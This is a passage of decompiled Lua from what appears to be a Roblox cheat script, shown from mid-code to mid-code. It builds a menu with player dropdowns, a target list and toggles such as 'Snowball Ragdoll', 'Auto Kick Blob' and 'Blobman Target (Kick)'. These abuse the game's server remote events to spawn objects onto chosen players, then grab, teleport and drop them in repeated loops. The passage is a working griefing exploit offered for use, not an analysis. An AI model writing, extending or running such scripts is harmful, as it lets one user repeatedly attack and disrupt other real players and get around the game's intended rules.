            -- upvalues: v192 (ref), v206 (ref)
            v192.Enabled = v207;
            v206(v207);
        end
    });
    v112:AddSlider({
        Name = "Launch Strength", 
        Min = 10, 
        Max = 3000, 
        Default = v192.Strength, 
        Increment = 50, 
        Callback = function(v208)
            -- upvalues: v192 (ref)
            v192.Strength = v208;
        end
    });
    local l_LocalPlayer_5 = game:GetService("Players").LocalPlayer;
    local _ = v112:AddSection({
        Name = "Snowball Ragdoll"
    });
    local v211 = {
        P = game:GetService("Players"), 
        RS = game:GetService("ReplicatedStorage"), 
        W = l_Workspace_0, 
        LP = game:GetService("Players").LocalPlayer, 
        Toy = game:GetService("ReplicatedStorage"):WaitForChild("MenuToys"), 
        Set = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"), 
        TP = "TP", 
        TE = false, 
        SE = false, 
        AE = false, 
        DD = "DD", 
        R = {}
    };
    local function v215()
        -- upvalues: v211 (ref)
        local v212 = {};
        for _, v214 in ipairs(v211.P:GetPlayers()) do
            if v214 ~= v211.LP then
                table.insert(v212, v214.Name);
            end;
        end;
        return v212;
    end;
    local function v216()
        -- upvalues: v211 (ref), v215 (ref)
        if v211.DD then
            v211.DD:Refresh(v215(), true);
        end;
    end;
    v211.P.PlayerAdded:Connect(v216);
    v211.P.PlayerRemoving:Connect(v216);
    local function v219(v217, v218)
        -- upvalues: v211 (ref)
        task.spawn(function()
            -- upvalues: v211 (ref), v217 (ref), v218 (ref)
            v211.Toy:WaitForChild("SpawnToyRemoteFunction"):InvokeServer(v217, CFrame.new(v218), Vector3.new());
        end);
    end;
    local function v229()
        -- upvalues: v211 (ref)
        while v211.AE do
            local l_FirstChild_0 = v211.W:FindFirstChild(v211.LP.Name .. "SpawnedInToys");
            if l_FirstChild_0 then
                for _, v222 in pairs(v211.R) do
                    local l_Character_8 = v222.Character;
                    local v224 = l_Character_8 and l_Character_8:FindFirstChild("HumanoidRootPart");
                    if v224 then
                        for _, v226 in ipairs(l_FirstChild_0:GetChildren()) do
                            if v226:IsA("Model") and v226.Name == "BallSnowball" then
                                for _, v228 in ipairs(v226:GetDescendants()) do
                                    if v228:IsA("BasePart") then
                                        v228.Position = v224.Position;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            task.wait(0.1);
        end;
    end;
    local function v234()
        -- upvalues: v211 (ref), v219 (ref)
        while v211.AE do
            v211.R = {};
            for _, v231 in pairs(v211.P:GetPlayers()) do
                if v231 ~= v211.LP and v231.Character then
                    local l_Humanoid_4 = v231.Character:FindFirstChild("Humanoid");
                    if l_Humanoid_4 and l_Humanoid_4.SeatPart and l_Humanoid_4.SeatPart.Parent.Name == "CreatureBlobman" then
                        table.insert(v211.R, v231);
                        local v233 = v211.LP.Character and v211.LP.Character:FindFirstChild("HumanoidRootPart");
                        if v233 then
                            v219("BallSnowball", v233.Position + Vector3.new(0, 2, 0));
                        end;
                    end;
                end;
            end;
            task.wait(0.1);
        end;
    end;
    local function v236()
        -- upvalues: v211 (ref), v219 (ref)
        while v211.SE do
            local v235 = v211.LP.Character and v211.LP.Character:FindFirstChild("HumanoidRootPart");
            if v235 then
                v219("BallSnowball", v235.Position + Vector3.new(0, 2, 0));
            end;
            task.wait(1);
        end;
    end;
    local function v244()
        -- upvalues: v211 (ref)
        while v211.TE do
            local l_FirstChild_1 = v211.W:FindFirstChild(v211.LP.Name .. "SpawnedInToys");
            if l_FirstChild_1 and v211.TP then
                local v238 = v211.P:FindFirstChild(v211.TP) and v211.P[v211.TP].Character;
                local v239 = v238 and v238:FindFirstChild("HumanoidRootPart");
                if v239 then
                    for _, v241 in ipairs(l_FirstChild_1:GetChildren()) do
                        if v241:IsA("Model") and v241.Name == "BallSnowball" then
                            for _, v243 in ipairs(v241:GetDescendants()) do
                                if v243:IsA("BasePart") then
                                    v243.Position = v239.Position;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            task.wait(0.1);
        end;
    end;
    v112:AddDropdown({
        Name = "Select Player", 
        Options = v215(), 
        Callback = function(v245)
            -- upvalues: v211 (ref)
            v211.TP = v245;
        end
    });
    v112:AddToggle({
        Name = "Snowball Ragdoll", 
        Callback = function(v246)
            -- upvalues: v211 (ref), v244 (ref)
            v211.TE = v246;
            if v246 then
                task.spawn(v244);
            end;
        end
    });
    v112:AddToggle({
        Name = "Auto Spawn", 
        Callback = function(v247)
            -- upvalues: v211 (ref), v236 (ref)
            v211.SE = v247;
            if v247 then
                task.spawn(v236);
            end;
        end
    });
    v112:AddToggle({
        Name = "Auto Kick Blob", 
        Callback = function(v248)
            -- upvalues: v211 (ref), v234 (ref), v229 (ref)
            v211.AE = v248;
            if v248 then
                task.spawn(v234);
                task.spawn(v229);
            end;
        end
    });
    if not game:IsLoaded() then
        game.Loaded:Wait();
    end;
    if not syn or not protectgui then
        getgenv().protectgui = function()

        end;
    end;
    local v249 = v44:MakeTab({
        Name = "Blobman Loop", 
        Icon = "rbxassetid://6031091005", 
        PremiumOnly = false
    });
    local _ = v249:AddSection({
        Name = "Blobman Target"
    });
    local v251 = {
        Players = game:GetService("Players"), 
        ReplicatedStorage = game:GetService("ReplicatedStorage"), 
        Workspace = game:GetService("Workspace"), 
        LocalPlayer = "Blobman Target", 
        TargetList = v47.TargetList or {}, 
        selectedPlayer = "selectedPlayer", 
        toggleEnabled = false, 
        teleportAllEnabled = false, 
        teleportDelay = 1, 
        currentBlobman = "currentBlobman", 
        masterRunning = false, 
        blobalter = 1, 
        ORIGIN_POS = "ORIGIN_POS", 
        MAX_TELEPORT_DIST = 500, 
        targetPlayerDropdown = "targetPlayerDropdown"
    };
    v251.LocalPlayer = v251.Players.LocalPlayer;
    v47.TargetList = v251.TargetList;
    local function v255()
        -- upvalues: v251 (ref)
        local v252 = {};
        for _, v254 in ipairs(v251.Players:GetPlayers()) do
            if v254 ~= v251.LocalPlayer then
                table.insert(v252, v254.Name);
            end;
        end;
        return v252;
    end;
    local function v256()
        -- upvalues: v251 (ref), v255 (ref)
        if v251.targetPlayerDropdown then
            v251.targetPlayerDropdown:Refresh(v255(), true);
        end;
    end;
    v251.targetPlayerDropdown = v249:AddDropdown({
        Name = "Select Player", 
        Default = "", 
        Options = v255(), 
        Callback = function(v257)
            -- upvalues: v251 (ref)
            v251.selectedPlayer = v251.Players:FindFirstChild(v257);
        end
    });
    v39(v251.targetPlayerDropdown);
    v249:AddButton({
        Name = "Add Selected Player to Target List", 
        Callback = function()
            -- upvalues: v251 (ref), v43 (ref)
            if v251.selectedPlayer and not v251.TargetList[v251.selectedPlayer.UserId] then
                v251.TargetList[v251.selectedPlayer.UserId] = v251.selectedPlayer.Name;
                v43:MakeNotification({
                    Name = "Player Added", 
                    Content = v251.selectedPlayer.Name .. " added to target list.", 
                    Time = 2
                });
            end;
        end
    });
    v249:AddButton({
        Name = "Remove Selected Player from Target List", 
        Callback = function()
            -- upvalues: v251 (ref), v43 (ref)
            if v251.selectedPlayer and v251.TargetList[v251.selectedPlayer.UserId] then
                v251.TargetList[v251.selectedPlayer.UserId] = "UserId";
                v43:MakeNotification({
                    Name = "Player Removed", 
                    Content = v251.selectedPlayer.Name .. " removed from target list.", 
                    Time = 2
                });
            end;
        end
    });
    local function v262(v258, v259)
        -- upvalues: v25 (ref)
        if v25 ~= 1 then
            if v258.Character and v258.Character:FindFirstChild("HumanoidRootPart") then
                local v260 = {
                    v259:FindFirstChild("RightDetector"), 
                    v258.Character:FindFirstChild("HumanoidRootPart"), 
                    v259:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
                };
                v259:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(v260));
                v25 = 1;
            end;
        elseif v258.Character and v258.Character:FindFirstChild("HumanoidRootPart") then
            local v261 = {
                v259:FindFirstChild("LeftDetector"), 
                v258.Character:FindFirstChild("HumanoidRootPart"), 
                v259:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
            };
            v259:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(v261));
            v25 = 2;
        end;
    end;
    local function v265()
        -- upvalues: l_LocalPlayer_0 (ref)
        local l_Character_9 = l_LocalPlayer_0.Character;
        if l_Character_9 then
            local l_Humanoid_5 = l_Character_9:FindFirstChildOfClass("Humanoid");
            if l_Humanoid_5 and l_Humanoid_5.SeatPart and l_Humanoid_5.SeatPart.Parent.Name == "CreatureBlobman" then
                return l_Humanoid_5.SeatPart.Parent;
            end;
        end;
        return nil;
    end;
    local function v270(v266, v267)
        -- upvalues: l_LocalPlayer_0 (ref)
        local v268 = l_LocalPlayer_0.Character and l_LocalPlayer_0.Character:FindFirstChild("HumanoidRootPart");
        if not v268 then
            return;
        else
            local l_BodyPosition_0 = Instance.new("BodyPosition");
            l_BodyPosition_0.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
            l_BodyPosition_0.P = 100000;
            l_BodyPosition_0.Position = v267;
            l_BodyPosition_0.Parent = v266.PrimaryPart;
            v268.CFrame = CFrame.new(v267);
            v266:SetPrimaryPartCFrame(CFrame.new(v267));
            task.wait(0.1);
            l_BodyPosition_0:Destroy();
            return;
        end;
    end;
    local function v277()
        -- upvalues: v14 (ref), l_Workspace_0 (ref), l_LocalPlayer_5 (ref), v43 (ref), v47 (ref), l_Players_0 (ref), v262 (ref)
        task.spawn(function()
            -- upvalues: v14 (ref), l_Workspace_0 (ref), l_LocalPlayer_5 (ref), v43 (ref), v47 (ref), l_Players_0 (ref), v262 (ref)
            while true do
                if v14 then
                    local v271 = nil;
                    for _, v273 in pairs(l_Workspace_0:GetDescendants()) do
                        if v273.Name == "CreatureBlobman" and v273:FindFirstChild("VehicleSeat") and v273.VehicleSeat:FindFirstChild("SeatWeld") and v273.VehicleSeat.SeatWeld.Part1:IsDescendantOf(l_LocalPlayer_5.Character) then
                            v271 = v273;
                            break;
                        end;
                    end;
                    if not v271 then
                        v43:MakeNotification({
                            Name = "Error", 
                            Content = "You must be mounted on a Blobman!", 
                            Time = 5
                        });
                        v14 = false;
                        return;
                    else
                        for v274, _ in pairs(v47.TargetList) do
                            local l_l_Players_0_PlayerByUserId_0 = l_Players_0:GetPlayerByUserId(v274);
                            if l_l_Players_0_PlayerByUserId_0 then
                                v262(l_l_Players_0_PlayerByUserId_0, v271);
                                task.wait(v47.BlobmanDelay or 0.1);
                            end;
                        end;
                        task.wait(0.02);
                    end;
                else
                    return;
                end;
            end;
        end);
    end;
    local function v283(v278, v279, v280)
        -- upvalues: l_LocalPlayer_0 (ref), v270 (ref), v262 (ref)
        if not l_LocalPlayer_0.Character or not l_LocalPlayer_0.Character:FindFirstChild("HumanoidRootPart") or not v278.Character or not v278.Character:FindFirstChild("HumanoidRootPart") then
            return false;
        else
            local l_HumanoidRootPart_6 = v278.Character.HumanoidRootPart;
            if (l_HumanoidRootPart_6.Position - v280).Magnitude > 20 then
                local v282 = l_HumanoidRootPart_6.Position + Vector3.new(0, 2, 0);
                v270(v279, v282);
                task.wait(0.2);
                v262(v278, v279);
                task.wait(0.2);
                v270(v279, v280);
                task.wait(0.2);
                if (l_HumanoidRootPart_6.Position - v280).Magnitude > 20 then
                    return false;
                else
                    return true;
                end;
            else
                return true;
            end;
        end;
    end;
    local function v292()
        -- upvalues: v14 (ref), v265 (ref), l_LocalPlayer_0 (ref), v47 (ref), l_Players_0 (ref), v283 (ref)
        task.spawn(function()
            -- upvalues: v14 (ref), v265 (ref), l_LocalPlayer_0 (ref), v47 (ref), l_Players_0 (ref), v283 (ref)
            while v14 do
                local v284 = v265();
                local v285 = l_LocalPlayer_0.Character and l_LocalPlayer_0.Character:FindFirstChild("HumanoidRootPart");
                if v284 and v285 then
                    local l_Position_1 = v285.Position;
                    for v287, _ in pairs(v47.TargetList) do
                        local l_l_Players_0_PlayerByUserId_1 = l_Players_0:GetPlayerByUserId(v287);
                        if l_l_Players_0_PlayerByUserId_1 and l_l_Players_0_PlayerByUserId_1.Character and l_l_Players_0_PlayerByUserId_1.Character:FindFirstChild("HumanoidRootPart") and (l_l_Players_0_PlayerByUserId_1.Character.HumanoidRootPart.Position - l_Position_1).Magnitude > 20 then
                            local v290 = false;
                            local v291 = 0;
                            while v14 and not v290 and v291 < 3 do
                                v290 = v283(l_l_Players_0_PlayerByUserId_1, v284, l_Position_1);
                                v291 = v291 + 1;
                                if not v290 then
                                    task.wait(0.5);
                                end;
                            end;
                        end;
                    end;
                end;
                task.wait(0.2);
            end;
        end);
    end;
    v249:AddToggle({
        Name = "Blobman Target (If you are in safe zone/void)", 
        Default = false, 
        Callback = function(v293)
            -- upvalues: v14 (ref), v277 (ref), v292 (ref)
            v14 = v293;
            if v293 then
                v277();
                v292();
            end;
        end
    });
    local function v297(v294)
        -- upvalues: v251 (ref)
        local v295 = RaycastParams.new();
        v295.FilterDescendantsInstances = {
            v251.LocalPlayer.Character
        };
        v295.FilterType = Enum.RaycastFilterType.Blacklist;
        local v296 = v251.Workspace:Raycast(v294 + Vector3.new(0, 50, 0), Vector3.new(0, -400), v295);
        return v296 and v296.Position or v294;
    end;
    local function v305()
        -- upvalues: v251 (ref), v297 (ref)
        local v298 = v251.LocalPlayer.Character and v251.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
        if v298 then
            local v299 = v297(v298.Position);
            local v300 = CFrame.new(v299 + Vector3.new(0, 3, 0));
            pcall(function()
                -- upvalues: v251 (ref), v300 (ref)
                v251.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", v300, Vector3.new(0, 59.667, 0));
            end);
            local v301 = v251.LocalPlayer.Name .. "SpawnedInToys";
            for _ = 1, 30 do
                local l_FirstChild_2 = v251.Workspace:FindFirstChild(v301);
                if l_FirstChild_2 then
                    local l_CreatureBlobman_0 = l_FirstChild_2:FindFirstChild("CreatureBlobman");
                    if l_CreatureBlobman_0 then
                        v251.blobalter = 1;
                        return l_CreatureBlobman_0;
                    end;
                end;
                task.wait(0.15);
            end;
            return nil;
        else
            return nil;
        end;
    end;
    local function v307()
        -- upvalues: v251 (ref)
        local l_FirstChild_3 = v251.Workspace:FindFirstChild(v251.LocalPlayer.Name .. "SpawnedInToys");
        return l_FirstChild_3 and l_FirstChild_3:FindFirstChild("CreatureBlobman") or nil;
    end;
    local function v310()
        -- upvalues: v251 (ref)
        local l_Character_10 = v251.LocalPlayer.Character;
        if l_Character_10 then
            local l_Humanoid_6 = l_Character_10:FindFirstChildOfClass("Humanoid");
            if l_Humanoid_6 and l_Humanoid_6.SeatPart and l_Humanoid_6.SeatPart.Parent and l_Humanoid_6.SeatPart.Parent.Name == "CreatureBlobman" then
                return l_Humanoid_6.SeatPart.Parent;
            else
                return nil;
            end;
        else
            return nil;
        end;
    end;
    local function v316(v311)
        -- upvalues: v251 (ref)
        if not v311 or not v251.LocalPlayer.Character then
            return;
        else
            local l_Character_11 = v251.LocalPlayer.Character;
            local l_Humanoid_7 = l_Character_11:FindFirstChildOfClass("Humanoid");
            local l_HumanoidRootPart_7 = l_Character_11:FindFirstChild("HumanoidRootPart");
            if l_Humanoid_7 and l_HumanoidRootPart_7 then
                local l_VehicleSeat_0 = v311:FindFirstChild("VehicleSeat");
                if l_VehicleSeat_0 and l_VehicleSeat_0:IsA("VehicleSeat") then
                    l_HumanoidRootPart_7.CFrame = l_VehicleSeat_0.CFrame + Vector3.new(0, 2, 0);
                    pcall(function()
                        -- upvalues: l_VehicleSeat_0 (ref), l_Humanoid_7 (ref)
                        l_VehicleSeat_0:Sit(l_Humanoid_7);
                    end);
                    task.wait(0.25);
                end;
                return;
            else
                return;
            end;
        end;
    end;
    local function v322(v317, v318)
        -- upvalues: v251 (ref)
        if not v317 or not v317.PrimaryPart then
            return;
        else
            local l_Character_12 = v251.LocalPlayer.Character;
            if l_Character_12 then
                local l_HumanoidRootPart_8 = l_Character_12:FindFirstChild("HumanoidRootPart");
                if l_HumanoidRootPart_8 then
                    local l_BodyPosition_1 = Instance.new("BodyPosition");
                    l_BodyPosition_1.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                    l_BodyPosition_1.P = 100000;
                    l_BodyPosition_1.Position = v318;
                    l_BodyPosition_1.Parent = v317.PrimaryPart;
                    pcall(function()
                        -- upvalues: l_HumanoidRootPart_8 (ref), v318 (ref), v317 (ref)
                        l_HumanoidRootPart_8.CFrame = CFrame.new(v318);
                        v317:SetPrimaryPartCFrame(CFrame.new(v318));
                    end);
                    task.wait(0.1);
                    if l_BodyPosition_1 and l_BodyPosition_1.Parent then
                        l_BodyPosition_1:Destroy();
                    end;
                    return;
                else
                    return;
                end;
            else
                return;
            end;
        end;
    end;
    local function v333(v323, v324)
        -- upvalues: v251 (ref)
        if not v323 or not v324 then
            return;
        elseif v323.Character and v323.Character:FindFirstChild("HumanoidRootPart") then
            local l_LeftDetector_0 = v324:FindFirstChild("LeftDetector");
            local l_RightDetector_0 = v324:FindFirstChild("RightDetector");
            local l_BlobmanSeatAndOwnerScript_0 = v324:FindFirstChild("BlobmanSeatAndOwnerScript");
            if l_BlobmanSeatAndOwnerScript_0 then
                local l_CreatureGrab_0 = l_BlobmanSeatAndOwnerScript_0:FindFirstChild("CreatureGrab");
                if l_CreatureGrab_0 then
                    if v251.blobalter == 1 then
                        local v329 = l_LeftDetector_0 and l_LeftDetector_0:FindFirstChild("LeftWeld");
                        do
                            local l_v329_0 = v329;
                            if l_LeftDetector_0 and l_v329_0 then
                                pcall(function()
                                    -- upvalues: l_CreatureGrab_0 (ref), l_LeftDetector_0 (ref), v323 (ref), l_v329_0 (ref)
                                    l_CreatureGrab_0:FireServer(l_LeftDetector_0, v323.Character.HumanoidRootPart, l_v329_0);
                                end);
                                v251.blobalter = 2;
                            end;
                        end;
                    else
                        local v331 = l_RightDetector_0 and l_RightDetector_0:FindFirstChild("RightWeld");
                        do
                            local l_v331_0 = v331;
                            if l_RightDetector_0 and l_v331_0 then
                                pcall(function()
                                    -- upvalues: l_CreatureGrab_0 (ref), l_RightDetector_0 (ref), v323 (ref), l_v331_0 (ref)
                                    l_CreatureGrab_0:FireServer(l_RightDetector_0, v323.Character.HumanoidRootPart, l_v331_0);
                                end);
                                v251.blobalter = 1;
                            end;
                        end;
                    end;
                    return;
                else
                    return;
                end;
            else
                return;
            end;
        else
            return;
        end;
    end;
    local function v342(v334, v335, v336, v337)
        -- upvalues: v251 (ref), v333 (ref), v322 (ref)
        if not v337 then
            v337 = 20;
        end;
        if v334 and v335 and v336 then
            if v334.Character and v334.Character:FindFirstChild("HumanoidRootPart") then
                local l_HumanoidRootPart_9 = v334.Character.HumanoidRootPart;
                local l_Magnitude_0 = (l_HumanoidRootPart_9.Position - v336).Magnitude;
                if not v251.ORIGIN_POS or (l_HumanoidRootPart_9.Position - v251.ORIGIN_POS).Magnitude <= v251.MAX_TELEPORT_DIST then
                    if l_Magnitude_0 <= v337 then
                        v333(v334, v335);
                        task.wait(0.1);
                        return true;
                    else
                        local v340 = l_HumanoidRootPart_9.Position + Vector3.new(0, 2, 0);
                        v322(v335, v340);
                        task.wait(0.2);
                        v333(v334, v335);
                        task.wait(0.2);
                        v322(v335, v336);
                        task.wait(0.2);
                        if v334.Character and v334.Character:FindFirstChild("HumanoidRootPart") then
                            if (v334.Character.HumanoidRootPart.Position - v336).Magnitude > v337 then
                                local _ = false;
                            end;
                            return true;
                        else
                            return false;
                        end;
                    end;
                else
                    return false;
                end;
            else
                return false;
            end;
        else
            return false;
        end;
    end;
    local function v358(v343, v344, v345)
        -- upvalues: v251 (ref), v322 (ref), v333 (ref)
        if v343 and v343.Character and v344 and v344.Parent then
            local l_HumanoidRootPart_10 = v343.Character:FindFirstChild("HumanoidRootPart");
            if l_HumanoidRootPart_10 then
                local l_BlobmanSeatAndOwnerScript_1 = v344:FindFirstChild("BlobmanSeatAndOwnerScript");
                if l_BlobmanSeatAndOwnerScript_1 then
                    local l_CreatureDrop_0 = l_BlobmanSeatAndOwnerScript_1:FindFirstChild("CreatureDrop");
                    local l_CreatureGrab_1 = l_BlobmanSeatAndOwnerScript_1:FindFirstChild("CreatureGrab");
                    if not l_CreatureDrop_0 or not l_CreatureGrab_1 then
                        return;
                    else
                        for v350 = 1, 4 do
                            if v251.toggleEnabled then
                                local v351 = (v345 or v251.LocalPlayer.Character and v251.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and v251.LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new()) + Vector3.new(0, 10 * v350, 0);
                                if v344 and v344.PrimaryPart then
                                    v322(v344, v351);
                                end;
                                task.wait(0.1);
                                local l_LeftDetector_1 = v344:FindFirstChild("LeftDetector");
                                local l_RightDetector_1 = v344:FindFirstChild("RightDetector");
                                local v354 = l_LeftDetector_1 and (l_LeftDetector_1:FindFirstChild("RigidConstraint") or l_LeftDetector_1:FindFirstChild("LeftWeld"));
                                local v355 = l_RightDetector_1 and (l_RightDetector_1:FindFirstChild("RightWeld") or l_RightDetector_1:FindFirstChild("RigidConstraint"));
                                do
                                    local l_v354_0, l_v355_0 = v354, v355;
                                    if l_v354_0 then
                                        pcall(function()
                                            -- upvalues: l_CreatureDrop_0 (ref), l_v354_0 (ref), l_HumanoidRootPart_10 (ref)
                                            l_CreatureDrop_0:FireServer(l_v354_0, l_HumanoidRootPart_10);
                                        end);
                                    end;
                                    if l_v355_0 then
                                        pcall(function()
                                            -- upvalues: l_CreatureDrop_0 (ref), l_v355_0 (ref), l_HumanoidRootPart_10 (ref)
                                            l_CreatureDrop_0:FireServer(l_v355_0, l_HumanoidRootPart_10);
                                        end);
                                    end;
                                    task.wait(0.1);
                                    v333(v343, v344);
                                    task.wait(0.1);
                                end;
                            else
                                break;
                            end;
                        end;
                        return;
                    end;
                else
                    return;
                end;
            else
                return;
            end;
        else
            return;
        end;
    end;
    local function v384()
        -- upvalues: v251 (ref), v47 (ref), v307 (ref), v305 (ref), v310 (ref), v316 (ref), v342 (ref), v358 (ref), v333 (ref)
        if not v251.masterRunning then
            v251.masterRunning = true;
            local l_Character_13 = v251.LocalPlayer.Character;
            local v360 = l_Character_13 and l_Character_13:FindFirstChild("HumanoidRootPart");
            if v360 then
                v251.ORIGIN_POS = v360.Position;
            end;
            v47.LastProcessed = v47.LastProcessed or {};
            task.spawn(function()
                -- upvalues: v251 (ref), v307 (ref), v305 (ref), v310 (ref), v316 (ref), v47 (ref), v342 (ref), v358 (ref), v333 (ref)
                local v361 = false;
                while v251.toggleEnabled do
                    if not v251.currentBlobman or v251.currentBlobman and not v251.currentBlobman.Parent then
                        v251.currentBlobman = v307();
                    end;
                    if not v251.currentBlobman or v251.currentBlobman and not v251.currentBlobman.Parent then
                        local v362 = v305();
                        if v362 then
                            v251.currentBlobman = v362;
                            task.wait(0.25);
                        end;
                    end;
                    if v251.currentBlobman and v251.currentBlobman.Parent then
                        local v363 = v310();
                        if not v363 or v363 ~= v251.currentBlobman then
                            local v364 = os.clock();
                            while v251.toggleEnabled and (not v363 or v363 ~= v251.currentBlobman) do
                                v316(v251.currentBlobman);
                                task.wait(0.25);
                                v363 = v310();
                                if v363 ~= v251.currentBlobman then
                                    if os.clock() - v364 >= 5 then
                                        local v365 = v305();
                                        if v365 then
                                            v251.currentBlobman = v365;
                                            task.wait(0.3);
                                            for _ = 1, 6 do
                                                if v251.toggleEnabled then
                                                    v316(v251.currentBlobman);
                                                    task.wait(0.25);
                                                    v361 = v310() == v251.currentBlobman;
                                                else
                                                    v361 = true;
                                                end;
                                                if v361 then
                                                    break;
                                                end;
                                                if v361 then
                                                    break;
                                                end;
                                            end;
                                            if not v361 then
                                                if not v361 then
                                                    break;
                                                end;
                                            end;
                                        else
                                            break;
                                        end;
                                    end;
                                else
                                    break;
                                end;
                                if v361 then
                                    break;
                                end;
                                if v361 then
                                    break;
                                end;
                            end;
                        end;
                        v361 = false;
                        if v310() == v251.currentBlobman then
                            local l_Character_14 = v251.LocalPlayer.Character;
                            local v368 = l_Character_14 and l_Character_14:FindFirstChild("HumanoidRootPart");
                            if v368 then
                                local l_Position_2 = v368.Position;
                                local v370 = {};
                                if v251.teleportAllEnabled then
                                    for _, v372 in ipairs(v251.Players:GetPlayers()) do
                                        if v372 ~= v251.LocalPlayer then
                                            table.insert(v370, v372);
                                        end;
                                    end;
                                else
                                    for v373, _ in pairs(v251.TargetList) do
                                        local l_PlayerByUserId_0 = v251.Players:GetPlayerByUserId(v373);
                                        if l_PlayerByUserId_0 then
                                            table.insert(v370, l_PlayerByUserId_0);
                                        end;
                                    end;
                                end;
                                if true then
                                    local l_l_Position_2_0 = l_Position_2;
                                    for _, v378 in ipairs(v370) do
                                        if v251.toggleEnabled then
                                            if true then
                                                local l_v378_0 = v378;
                                                if l_v378_0 and l_v378_0.Character and l_v378_0.Character:FindFirstChild("HumanoidRootPart") then
                                                    if v47.LastProcessed[l_v378_0.UserId] then
                                                        local v380 = l_v378_0.Character and l_v378_0.Character:FindFirstChild("HumanoidRootPart");
                                                        local v381 = l_v378_0.Character and l_v378_0.Character:FindFirstChild("Humanoid");
                                                        if not v380 or not v381 or v381.Health <= 0 or (v380.Position - l_l_Position_2_0).Magnitude > 20 then
                                                            v47.LastProcessed[l_v378_0.UserId] = 20;
                                                        end;
                                                    end;
                                                    if v251.ORIGIN_POS and (l_v378_0.Character.HumanoidRootPart.Position - v251.ORIGIN_POS).Magnitude <= v251.MAX_TELEPORT_DIST then
                                                        if (l_v378_0.Character.HumanoidRootPart.Position - l_l_Position_2_0).Magnitude > 20 then
                                                            local v382 = false;
                                                            local v383 = 0;
                                                            while v251.toggleEnabled and not v382 and v383 < 3 and v251.currentBlobman and v251.currentBlobman.Parent and v310() == v251.currentBlobman do
                                                                v382 = v342(l_v378_0, v251.currentBlobman, l_l_Position_2_0, 20);
                                                                v383 = v383 + 1;
                                                                if v382 then
                                                                    pcall(function()
                                                                        -- upvalues: v358 (ref), l_v378_0 (ref), v251 (ref), l_l_Position_2_0 (ref)
                                                                        v358(l_v378_0, v251.currentBlobman, l_l_Position_2_0);
                                                                    end);
                                                                    v47.LastProcessed[l_v378_0.UserId] = tick();
                                                                else
                                                                    task.wait(0.4);
                                                                end;
                                                            end;
                                                        else
                                                            v333(l_v378_0, v251.currentBlobman);
                                                            task.wait(v47.BlobmanDelay or 0.1);
                                                            pcall(function()
                                                                -- upvalues: v358 (ref), l_v378_0 (ref), v251 (ref), l_l_Position_2_0 (ref)
                                                                v358(l_v378_0, v251.currentBlobman, l_l_Position_2_0);
                                                            end);
                                                            v47.LastProcessed[l_v378_0.UserId] = tick();
                                                        end;
                                                    end;
                                                end;
                                            end;
                                        else
                                            break;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                    task.wait(0.25);
                end;
                v251.masterRunning = false;
            end);
            return;
        else
            return;
        end;
    end;
    v251.LocalPlayer.CharacterAdded:Connect(function()
        -- upvalues: v251 (ref), v384 (ref)
        if v251.toggleEnabled then
            task.wait(1.5);
            local v385 = v251.LocalPlayer.Character and v251.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
            if v385 then
                v251.ORIGIN_POS = v385.Position;
            end;
            v384();
        end;
    end);
    v249:AddToggle({
        Name = "Blobman Target (Kick)", 
        Default = false, 
        Callback = function(v386)
            -- upvalues: v251 (ref), v384 (ref)
            v251.toggleEnabled = v386;
            if v386 then
                local v387 = v251.LocalPlayer.Character and v251.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
                if v387 then
                    v251.ORIGIN_POS = v387.Position;
                end;
                v384();
            end;
        end
    });
    v249:AddSlider({
        Name = "Teleport Duration", 
        Min = 0.25, 
        Max = 3, 
        Default = v251.teleportDelay, 
        Increment = 0.01, 
        ValueName = "Seconds", 
        Callback = function(v388)
            -- upvalues: v251 (ref)
            v251.teleportDelay = v388;
        end
    });
    v251.Players.PlayerAdded:Connect(v256);
    v251.Players.PlayerRemoving:Connect(v256);
    local v389 = {
        autoGrab = false, 
        autoGrabCoroutine = "autoGrabCoroutine"
    };
    local function v397(v390, v391)
        local l_LeftDetector_2 = v390:FindFirstChild("LeftDetector");
        local l_RightDetector_2 = v390:FindFirstChild("RightDetector");
        local l_BlobmanSeatAndOwnerScript_2 = v390:FindFirstChild("BlobmanSeatAndOwnerScript");
        if not l_LeftDetector_2 or not l_RightDetector_2 or not l_BlobmanSeatAndOwnerScript_2 or not v391 then
            return;
        else
            local l_RigidConstraint_0 = l_LeftDetector_2:FindFirstChild("RigidConstraint");
            local l_RightWeld_0 = l_RightDetector_2:FindFirstChild("RightWeld");
            if l_RigidConstraint_0 then
                pcall(function()
                    -- upvalues: l_BlobmanSeatAndOwnerScript_2 (ref), l_LeftDetector_2 (ref), v391 (ref), l_RigidConstraint_0 (ref)
                    l_BlobmanSeatAndOwnerScript_2.CreatureGrab:FireServer(l_LeftDetector_2, v391, l_RigidConstraint_0);
                    l_BlobmanSeatAndOwnerScript_2.CreatureDrop:FireServer(l_RigidConstraint_0, v391);
                end);
            end;
            if l_RightWeld_0 then
                pcall(function()
                    -- upvalues: l_BlobmanSeatAndOwnerScript_2 (ref), l_RightDetector_2 (ref), v391 (ref), l_RightWeld_0 (ref)
                    l_BlobmanSeatAndOwnerScript_2.CreatureGrab:FireServer(l_RightDetector_2, v391, l_RightWeld_0);
                    l_BlobmanSeatAndOwnerScript_2.CreatureDrop:FireServer(l_RightWeld_0, v391);
                end);
            end;
            return;
        end;
    end;
    local function v401()
        -- upvalues: l_Workspace_0 (ref)
        for _, v399 in pairs(l_Workspace_0:GetDescendants()) do
            if v399:IsA("Model") and v399.Name == "CreatureBlobman" and v399:FindFirstChild("VehicleSeat") then
                local l_SeatWeld_0 = v399.VehicleSeat:FindFirstChild("SeatWeld");
